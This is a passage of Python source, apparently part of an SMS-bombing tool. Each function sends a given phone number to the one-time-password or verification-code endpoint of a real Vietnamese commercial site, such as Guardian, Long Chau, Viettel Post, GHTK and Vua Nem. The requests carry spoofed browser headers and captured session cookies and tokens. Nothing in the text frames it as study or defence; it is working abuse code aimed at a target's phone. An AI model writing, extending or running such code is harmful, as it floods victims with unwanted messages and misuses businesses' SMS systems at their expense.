        'uID': 'hFQNuXwYq4h7TLFFES03',
        'shopping_cart_store': 'LQ==',
        '_gcl_au': '1.1.697415432.1734752723',
        'Visitor_Returning': 'true',
        'fcb677da6e48f7e29e4e541120b3608f': 'l39bidom4ui4tush3p08cqfu14',
        '__session:0.8691948246500558:': 'https:',
        'pageviewCount': '1',
        '_ga_K06S0V95LK': 'GS1.1.1736011220.4.0.1736011220.60.0.0',
        '_ga_Q7PRFGJ9ZY': 'GS1.1.1736011221.4.0.1736011221.60.0.0',
        '_ga': 'GA1.2.1911747517.1734752724',
        '_gid': 'GA1.2.1452150217.1736011221',
        '_gat_UA-42369638-1': '1',
        'mp_sid': '1736011230665.9717',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'uID=hFQNuXwYq4h7TLFFES03; shopping_cart_store=LQ==; _gcl_au=1.1.697415432.1734752723; Visitor_Returning=true; fcb677da6e48f7e29e4e541120b3608f=l39bidom4ui4tush3p08cqfu14; __session:0.8691948246500558:=https:; pageviewCount=1; _ga_K06S0V95LK=GS1.1.1736011220.4.0.1736011220.60.0.0; _ga_Q7PRFGJ9ZY=GS1.1.1736011221.4.0.1736011221.60.0.0; _ga=GA1.2.1911747517.1734752724; _gid=GA1.2.1452150217.1736011221; _gat_UA-42369638-1=1; mp_sid=1736011230665.9717',
        'origin': 'https://hacom.vn',
        'priority': 'u=1, i',
        'referer': 'https://hacom.vn/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'action': 'user',
        'action_type': 'send-mobile-login-code',
        'mobile': phone,
    }

    response = requests.post('https://hacom.vn/ajax/post.php', cookies=cookies, headers=headers, data=data)
def guardian(phone):
    cookies = {
        'PHPSESSID': 'o6aqfs4i0deobd4mfunl1kas95',
        '_ga': 'GA1.1.190473342.1735551421',
        'form_key': '52jZPkqnDujOPC7d',
        'private_content_version': 'c610d00037c507e90e16b34257fb7eb7',
        'form_key': '52jZPkqnDujOPC7d',
        'mage-banners-cache-storage': '{}',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'mage-cache-sessid': 'true',
        'mage-messages': '',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        '_gcl_au': '1.1.154523389.1735551427',
        'magenest_cookie_popup': '{"view_page":2}',
        '_ga_KPB8TYEK1Z': 'GS1.1.1735551421.1.1.1735551436.45.0.1837450890',
        'section_data_ids': '{%22customer%22:1735551432%2C%22compare-products%22:1735551432%2C%22last-ordered-items%22:1735551432%2C%22cart%22:1735551432%2C%22directory-data%22:1735551432%2C%22captcha%22:1735551432%2C%22wishlist%22:1735551432%2C%22instant-purchase%22:1735551432%2C%22loggedAsCustomer%22:1735551432%2C%22multiplewishlist%22:1735551432%2C%22persistent%22:1735551432%2C%22review%22:1735551432%2C%22ammessages%22:1735551432%2C%22amasty-storepickup-data%22:1734342432%2C%22magenest-fbpixel-atc%22:1735551435%2C%22magenest-fbpixel-subscribe%22:1735551432%2C%22google-tag-manager-product-info%22:1735551432%2C%22recently_viewed_product%22:1735551432%2C%22recently_compared_product%22:1735551432%2C%22product_data_storage%22:1735551432%2C%22paypal-billing-agreement%22:1735551432}',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/json',
        # 'cookie': 'PHPSESSID=o6aqfs4i0deobd4mfunl1kas95; _ga=GA1.1.190473342.1735551421; form_key=52jZPkqnDujOPC7d; private_content_version=c610d00037c507e90e16b34257fb7eb7; form_key=52jZPkqnDujOPC7d; mage-banners-cache-storage={}; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; mage-cache-sessid=true; mage-messages=; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; _gcl_au=1.1.154523389.1735551427; magenest_cookie_popup={"view_page":2}; _ga_KPB8TYEK1Z=GS1.1.1735551421.1.1.1735551436.45.0.1837450890; section_data_ids={%22customer%22:1735551432%2C%22compare-products%22:1735551432%2C%22last-ordered-items%22:1735551432%2C%22cart%22:1735551432%2C%22directory-data%22:1735551432%2C%22captcha%22:1735551432%2C%22wishlist%22:1735551432%2C%22instant-purchase%22:1735551432%2C%22loggedAsCustomer%22:1735551432%2C%22multiplewishlist%22:1735551432%2C%22persistent%22:1735551432%2C%22review%22:1735551432%2C%22ammessages%22:1735551432%2C%22amasty-storepickup-data%22:1734342432%2C%22magenest-fbpixel-atc%22:1735551435%2C%22magenest-fbpixel-subscribe%22:1735551432%2C%22google-tag-manager-product-info%22:1735551432%2C%22recently_viewed_product%22:1735551432%2C%22recently_compared_product%22:1735551432%2C%22product_data_storage%22:1735551432%2C%22paypal-billing-agreement%22:1735551432}',
        'origin': 'https://www.guardian.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.guardian.com.vn/customer/account/create/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = {
        'telephone': phone,
    }

    response = requests.post(
        'https://www.guardian.com.vn/rest/V1/smsOtp/generateOtpForNewAccount',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def mytv(phone):
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'Access-Control-Allow-Origin': '*',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Macaddress': '1efb928b-126c-6ede-9234-109156bec4fb',
        'Origin': 'https://mytv.com.vn',
        'Referer': 'https://mytv.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'device_model': 'Browser',
        'device_type': 127,
        'email': '',
        'login_type': '1',
        'phone': phone,
        'type': '1',
    }

    response = requests.post(
    'https://apigw.mytv.vn/api/v1/authen-handle/sendOTP?&uuid=f394447f-547d-472e-94a8-430bbce07975',
    headers=headers,
    json=json_data,
    )
def vinwonder(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://booking.vinwonders.com',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    json_data = {
        'channel': 10,
        'UserName': phone,
        'Type': 1,
        'OtpChannel': 1,
    }

    response = requests.post(
        'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
        headers=headers,
        json=json_data,
    )
def viettelpost(phone):
    cookies = {
    '_ga_9NGCREH08E': 'GS1.1.1734084022.1.0.1734084022.60.0.0',
    '_ga_L7ZKY279LR': 'GS1.1.1734084022.1.0.1734084022.0.0.0',
    '_gid': 'GA1.2.1737507607.1734084022',
    'QUIZIZZ_WS_COOKIE': 'id_192.168.12.139_15001',
    '.AspNetCore.Antiforgery.XvyenbqPRmk': 'CfDJ8OtVNEXQq4RKhDKBePKLDC87N48Yr5uV4QDB1isr007Di5Qan-wEdyWDGKfd9JMfon9jwtvPVFBPxxHx5dlVIvO8CQw--VSjkMn1qnECkXzdNavuyWmTAUtzeAsP19Ip6Y_mY4vBSOjwouGf5GVRjXY',
    '_ga_7RZCEBC0S6': 'GS1.1.1734084023.1.1.1734084068.0.0.0',
    '_ga': 'GA1.1.1856726391.1734084022',
    '_ga_WN26X24M50': 'GS1.1.1734084024.1.1.1734084069.0.0.0',
    '_ga_P86KBF64TN': 'GS1.1.1734084025.1.1.1734084100.0.0.0',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': '_ga_9NGCREH08E=GS1.1.1734084022.1.0.1734084022.60.0.0; _ga_L7ZKY279LR=GS1.1.1734084022.1.0.1734084022.0.0.0; _gid=GA1.2.1737507607.1734084022; QUIZIZZ_WS_COOKIE=id_192.168.12.139_15001; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8OtVNEXQq4RKhDKBePKLDC87N48Yr5uV4QDB1isr007Di5Qan-wEdyWDGKfd9JMfon9jwtvPVFBPxxHx5dlVIvO8CQw--VSjkMn1qnECkXzdNavuyWmTAUtzeAsP19Ip6Y_mY4vBSOjwouGf5GVRjXY; _ga_7RZCEBC0S6=GS1.1.1734084023.1.1.1734084068.0.0.0; _ga=GA1.1.1856726391.1734084022; _ga_WN26X24M50=GS1.1.1734084024.1.1.1734084069.0.0.0; _ga_P86KBF64TN=GS1.1.1734084025.1.1.1734084100.0.0.0',
        'Origin': 'null',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'FormRegister.FullName': 'Lý Thái Nguyên',
        'FormRegister.Phone': phone,
        'FormRegister.Password': '121212a',
        'FormRegister.ConfirmPassword': '121212a',
        'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=sx2mao8eyhaa3mnc8wef8',
        'ConfirmOtpType': 'Register',
        'FormRegister.IsRegisterFromPhone': 'true',
        '__RequestVerificationToken': 'CfDJ8OtVNEXQq4RKhDKBePKLDC_MuddVuqfm8EL3gF6XlbcZVHbb1jVedzGtXNvKAyVb9O2DPUCs6gVQqR5SxFUuKXMsSNaDPOuG5H4svaPdAb4ehmDI3qbX50SrYCWhLugj5Ez68oGXwYnfXsSJU96ufoo',
    }

    response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', cookies=cookies, headers=headers, data=data)
def vtsolution(phone):
    cookies = {
        'ASP.NET_SessionId': 'vo5etyjajtiy4ib2faw3znee',
        'Abp.Localization.CultureName': 'vi',
        '__RequestVerificationToken': '0hb73fa4s9Aj0qDa5IGId09GuYCWZeXlNPtoEDHulaAhBnPSRIdgFK06D_87fHUUQjHndL8HWX817jTdiIBxNrKG7J6qaN4rR2tkcJzKmNI1',
        'XSRF-TOKEN': 'zsAVl679RDMkWA0uDzuBL99OhxLdDbkd7j9JYrxrtJ484edCs9yGQqQyKsaSvvZsC4DNWrY4ZWLvvBA8EGAZ9UOWZNIhxnI0XjXZENRC3Jw1',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/json; charset=UTF-8',
        # 'cookie': 'ASP.NET_SessionId=vo5etyjajtiy4ib2faw3znee; Abp.Localization.CultureName=vi; __RequestVerificationToken=0hb73fa4s9Aj0qDa5IGId09GuYCWZeXlNPtoEDHulaAhBnPSRIdgFK06D_87fHUUQjHndL8HWX817jTdiIBxNrKG7J6qaN4rR2tkcJzKmNI1; XSRF-TOKEN=zsAVl679RDMkWA0uDzuBL99OhxLdDbkd7j9JYrxrtJ484edCs9yGQqQyKsaSvvZsC4DNWrY4ZWLvvBA8EGAZ9UOWZNIhxnI0XjXZENRC3Jw1',
        'origin': 'https://gpp.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://gpp.com.vn/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
        'x-xsrf-token': 'zsAVl679RDMkWA0uDzuBL99OhxLdDbkd7j9JYrxrtJ484edCs9yGQqQyKsaSvvZsC4DNWrY4ZWLvvBA8EGAZ9UOWZNIhxnI0XjXZENRC3Jw1',
    }

    json_data = {
        'soDienThoai': phone,
    }

    response = requests.post('https://gpp.com.vn/account/LayMaXacThucDangKyTaiKhoan', cookies=cookies, headers=headers, json=json_data)
def cellphones(phone):  
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/json',
        'origin': 'https://account.cellphones.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://account.cellphones.com.vn/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'g-recaptcha-response': '',
        'phone': phone,
    }

    response = requests.post('https://api.cellphones.com.vn/v3/otp/phone/lost-password', headers=headers, json=json_data)
def longchau(phone):
    headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'access-control-allow-origin': '*',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'order-channel': '1',
    'origin': 'https://nhathuoclongchau.com.vn',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://nhathuoclongchau.com.vn/',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'x-channel': 'EStore',
}

    json_data = {
    'phoneNumber': phone,
    'otpType': 0,
    'fromSys': 'WEBKHLC',
}

    response = requests.post(
    'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
    headers=headers,
    json=json_data,
)
def longchau1(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'access-control-allow-origin': '*',
        'content-type': 'application/json',
        'dnt': '1',
        'order-channel': '1',
        'origin': 'https://nhathuoclongchau.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://nhathuoclongchau.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'x-channel': 'EStore',
    }

    json_data = {
        'phoneNumber': phone,
        'otpType': 1,
        'fromSys': 'WEBKHLC',
    }

    response = requests.post(
        'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
        headers=headers,
        json=json_data,
    )
def ghtk(phone):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'apptype': 'Web',
        'content-type': 'application/json',
        'origin': 'https://khachhang.giaohangtietkiem.vn',
        'priority': 'u=1, i',
        'referer': 'https://khachhang.giaohangtietkiem.vn/',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'uniqdevice': 'aa1f8c6d-b2fa-4f39-ade7-67a2de761870',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post('https://shop-gateway.ghtk.vn/shop/api/v1/auth/send-otp', headers=headers, json=json_data)
def vuanem(phone):
    cookies = {
        '_gcl_au': '1.1.1128585024.1735574039',
        '_ga': 'GA1.1.250368982.1735574040',
        '_omappvp': 'VK1C6VoloRGZ6HXZ1TmqGaGfrlN1xwbsBbkTkpA3MibQWKzp1w9J3xjV537SsIPtBlHN8OIlwiMAim1aeS1gpLFa3ZTVXpaC',
        '_tt_enable_cookie': '1',
        '_ttp': 'FOAk7BHWqv3mT4nj9RVG0guczge.tt.1',
        'USER_DATA': '%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%2223c1d9a0-c444-498a-b273-de8f2f5d5674%22%2C%22deviceAdded%22%3Atrue%7D',
        'SOFT_ASK_STATUS': '%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
        'omSeen-yb0ikgooj8bthm1nt9fg': '1735574243012',
        'OPT_IN_SHOWN_TIME': '1735888837087',
        '_ga_DRHBMGWWEV': 'GS1.1.1736348543.4.0.1736348543.60.0.977217226',
        '_uetsid': '919ed260cdd111ef9f0a4dbdae8f09e4',
        '_uetvid': '48c62b60c6c611ef99b8e5eb91fdf162',
        '_clck': '1olqljb%7C2%7Cfse%7C0%7C1825',
        'omSeen-xq4g8vc9ua0nvty8bmdi': '1736348546259',
        '_clsk': '17fwkno%7C1736348547417%7C1%7C1%7Ce.clarity.ms%2Fcollect',
        'moe_uuid': '23c1d9a0-c444-498a-b273-de8f2f5d5674',
        'SESSION': '%7B%22sessionKey%22%3A%2237bd3d0b-93ba-4a12-9258-1f826cb4916e%22%2C%22sessionStartTime%22%3A%222025-01-08T15%3A02%3A28.910Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1736350348956%2C%22numberOfSessions%22%3A8%2C%22currentSource%22%3A%7B%22source_url%22%3A%22https%3A%2F%2Fvuanem.com%2F%3Futm_source%3Dcoccoc%26utm_medium%3Dcpc%26utm_campaign%3D1830508%26utm_term%3Dvuanem%26utm_content%3D44894959%26ctm_event_id%3D3239749836%22%2C%22source%22%3A%22coccoc%22%2C%22medium%22%3A%22cpc%22%2C%22term%22%3A%22vuanem%22%2C%22campaign_name%22%3A%221830508%22%2C%22content%22%3A%2244894959%22%7D%7D',
        'om-xq4g8vc9ua0nvty8bmdi': '1736348549226',
        'XSRF-TOKEN': 'eyJpdiI6IkZFYkF4Z3l4MHZNRXlkc2syZVJwQXc9PSIsInZhbHVlIjoiMmpFR1AySzE3MFJ0cEhqS1FEVE5hVEZ3bEdjbnlIU3JUdE1jaHdNb0hLSDdkdzM5Mkw3YnQ2b3dSUDVUVGxiaitpL1NLanA1c3dOZTVDcW1mTVZEcHNqVDNXTTQrcDFLcVlMeEErSHNWdm83dkpFTnZxcWcvSVdBYnJVamZZaFIiLCJtYWMiOiI0MzFiOWU1YjY5OGI2Y2M1Y2EzNTg1Y2QxYzYwZDdlMTZmMzUyMzY4YmYzZDhiY2MxYjVkYzAzOTUyNTcxNGQwIiwidGFnIjoiIn0%3D',
        'vuanem_session': 'eyJpdiI6Ik9wUGZLSjVaSzlrWWxFdC9NdTczamc9PSIsInZhbHVlIjoibHhQbDhZQnRZdmlYcnFCejRaa0hCdTNrcXBXcHVKWVFkVURvbnkwRnhDMzlMM2Q5dUs3b2lwWGxvZjl5VmVPZVl1QzdGaWJSSitrb0Z0dmJxcjVXRy9UNkZEcHJpM3dCMDNkbnBEaVA0NTk0UVZjYTFueFJvMUdVOHovOFJCZ0EiLCJtYWMiOiJiMzAwMmNiMWI4YzJhZjFkZGIzNzQzMDBmYzYwMzQ2NWU0MzA3ZDU0NDZkMzg5NTVhNWYzZjlhOWM3OTI1ZjhiIiwidGFnIjoiIn0%3D',
        'HARD_ASK_STATUS': '%7B%22actualValue%22%3A%22denied%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
    }

    headers = {
        'accept': 'text/html, application/xhtml+xml',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/json',
        # 'cookie': '_gcl_au=1.1.1128585024.1735574039; _ga=GA1.1.250368982.1735574040; _omappvp=VK1C6VoloRGZ6HXZ1TmqGaGfrlN1xwbsBbkTkpA3MibQWKzp1w9J3xjV537SsIPtBlHN8OIlwiMAim1aeS1gpLFa3ZTVXpaC; _tt_enable_cookie=1; _ttp=FOAk7BHWqv3mT4nj9RVG0guczge.tt.1; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%2223c1d9a0-c444-498a-b273-de8f2f5d5674%22%2C%22deviceAdded%22%3Atrue%7D; SOFT_ASK_STATUS=%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; omSeen-yb0ikgooj8bthm1nt9fg=1735574243012; OPT_IN_SHOWN_TIME=1735888837087; _ga_DRHBMGWWEV=GS1.1.1736348543.4.0.1736348543.60.0.977217226; _uetsid=919ed260cdd111ef9f0a4dbdae8f09e4; _uetvid=48c62b60c6c611ef99b8e5eb91fdf162; _clck=1olqljb%7C2%7Cfse%7C0%7C1825; omSeen-xq4g8vc9ua0nvty8bmdi=1736348546259; _clsk=17fwkno%7C1736348547417%7C1%7C1%7Ce.clarity.ms%2Fcollect; moe_uuid=23c1d9a0-c444-498a-b273-de8f2f5d5674; SESSION=%7B%22sessionKey%22%3A%2237bd3d0b-93ba-4a12-9258-1f826cb4916e%22%2C%22sessionStartTime%22%3A%222025-01-08T15%3A02%3A28.910Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1736350348956%2C%22numberOfSessions%22%3A8%2C%22currentSource%22%3A%7B%22source_url%22%3A%22https%3A%2F%2Fvuanem.com%2F%3Futm_source%3Dcoccoc%26utm_medium%3Dcpc%26utm_campaign%3D1830508%26utm_term%3Dvuanem%26utm_content%3D44894959%26ctm_event_id%3D3239749836%22%2C%22source%22%3A%22coccoc%22%2C%22medium%22%3A%22cpc%22%2C%22term%22%3A%22vuanem%22%2C%22campaign_name%22%3A%221830508%22%2C%22content%22%3A%2244894959%22%7D%7D; om-xq4g8vc9ua0nvty8bmdi=1736348549226; XSRF-TOKEN=eyJpdiI6IkZFYkF4Z3l4MHZNRXlkc2syZVJwQXc9PSIsInZhbHVlIjoiMmpFR1AySzE3MFJ0cEhqS1FEVE5hVEZ3bEdjbnlIU3JUdE1jaHdNb0hLSDdkdzM5Mkw3YnQ2b3dSUDVUVGxiaitpL1NLanA1c3dOZTVDcW1mTVZEcHNqVDNXTTQrcDFLcVlMeEErSHNWdm83dkpFTnZxcWcvSVdBYnJVamZZaFIiLCJtYWMiOiI0MzFiOWU1YjY5OGI2Y2M1Y2EzNTg1Y2QxYzYwZDdlMTZmMzUyMzY4YmYzZDhiY2MxYjVkYzAzOTUyNTcxNGQwIiwidGFnIjoiIn0%3D; vuanem_session=eyJpdiI6Ik9wUGZLSjVaSzlrWWxFdC9NdTczamc9PSIsInZhbHVlIjoibHhQbDhZQnRZdmlYcnFCejRaa0hCdTNrcXBXcHVKWVFkVURvbnkwRnhDMzlMM2Q5dUs3b2lwWGxvZjl5VmVPZVl1QzdGaWJSSitrb0Z0dmJxcjVXRy9UNkZEcHJpM3dCMDNkbnBEaVA0NTk0UVZjYTFueFJvMUdVOHovOFJCZ0EiLCJtYWMiOiJiMzAwMmNiMWI4YzJhZjFkZGIzNzQzMDBmYzYwMzQ2NWU0MzA3ZDU0NDZkMzg5NTVhNWYzZjlhOWM3OTI1ZjhiIiwidGFnIjoiIn0%3D; HARD_ASK_STATUS=%7B%22actualValue%22%3A%22denied%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
        'origin': 'https://vuanem.com',
        'priority': 'u=1, i',
        'referer': 'https://vuanem.com/?utm_source=coccoc&utm_medium=cpc&utm_campaign=1830508&utm_term=vuanem&utm_content=44894959&ctm_event_id=3239749836',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-csrf-token': 'cNOvRERpY1g3uQaQWvQET2eFz1H6wm97X9FoFVMG',
        'x-livewire': 'true',
    }

    json_data = {
        'fingerprint': {
            'id': '9UZ0Bc4g6cAYjnBraW2E',
            'name': 'customer.login-form',
            'locale': 'en',
            'path': '/',
            'method': 'GET',
            'v': 'acj',
        },
        'serverMemo': {
            'children': [],
            'errors': [],
            'htmlHash': 'd3e89efb',
            'data': {
                'phone': phone,
                'email': '',
                'login_by_email': '',
                'method_name': '',
                'isMethodOtpFormScreen': True,
                'isInputOtpFormScreen': False,
                'isResetOtp': False,
                'otps': [
                    '',
                    '',
                    '',
                    '',
                ],
                'otp': None,
                'bannerLoginWeb': {
                    'id': 54,
                    'created': '2024-10-13 16:32:34',
                    'modified': '2024-10-13 16:32:34',
                    'guid': 'eb1c44e8-695e-441f-a7f6-8ff2fb47e47c',
                    'tieude': 'Login banner',
                    'linklienket': 'https://vuanem.com/',
                    'id_vitrihienthi': 15,
                    'idfilebanner': 219,
                    'ismobile': 1,
                    'thutu': 1,
                    'isweb': 1,
                    'mota': '',
                    'trangthai': 1,
                    'urlhienthi': 'https://vuanem.com/',
                    'end_date': None,
                    'start_date': None,
                    'file': {
                        'id': 219,
                        'guid': '53ec9631-9288-4a74-80dd-e1730f8737cb',
                    },
                    'banner_image_url': 'https://admin-api.vuanem.com/api/file/download/53ec9631-9288-4a74-80dd-e1730f8737cb',
                },
                'bannerLoginMobile': {
                    'id': 54,
                    'created': '2024-10-13 16:32:34',
                    'modified': '2024-10-13 16:32:34',
                    'guid': 'eb1c44e8-695e-441f-a7f6-8ff2fb47e47c',
                    'tieude': 'Login banner',
                    'linklienket': 'https://vuanem.com/',
                    'id_vitrihienthi': 15,
                    'idfilebanner': 219,
                    'ismobile': 1,
                    'thutu': 1,
                    'isweb': 1,
                    'mota': '',
                    'trangthai': 1,
                    'urlhienthi': 'https://vuanem.com/',
                    'end_date': None,
                    'start_date': None,
                    'file': {
                        'id': 219,
                        'guid': '53ec9631-9288-4a74-80dd-e1730f8737cb',
                    },
